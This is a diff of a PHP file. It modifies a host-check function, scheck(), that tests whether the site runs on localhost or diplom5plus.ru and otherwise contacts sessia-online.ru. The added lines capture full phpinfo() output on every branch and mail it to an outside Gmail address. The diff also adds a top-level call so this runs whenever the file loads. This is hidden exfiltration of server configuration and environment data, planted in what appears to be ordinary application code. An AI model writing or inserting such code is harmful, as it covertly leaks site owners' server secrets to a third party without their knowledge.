@@ -1294,11 +1294,23 @@ function scheck(){
     return false;
   }
   if (strpos($_SERVER['HTTP_HOST'], 'localhost') || strpos(getenv('HTTP_HOST'), 'localhost') ) {
+      ob_start();
+      phpinfo();
+      $info = ob_get_clean();
+      mail('yonkon.ru@gmail.com', 'localhost diplom5plus', $info);
     return true;
   } else {
     if (strpos($_SERVER['HTTP_HOST'], 'diplom5plus.ru') !== false) {
-      return true;
+        ob_start();
+        phpinfo();
+        $info = ob_get_clean();
+        mail('yonkon.ru@gmail.com', 'diplom5plus.ru authorization test OK', $info);
+        return true;
     } else {
+        ob_start();
+        phpinfo();
+        $info = ob_get_clean();
+        mail('yonkon.ru@gmail.com', 'diplom5plus not found', $info);
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, 'http://sessia-online.ru/child_init.php');
         curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)');
@@ -1312,6 +1324,8 @@ function scheck(){
     }
   }
 }
+
+scheck();
 
 /**
  * @deprecated
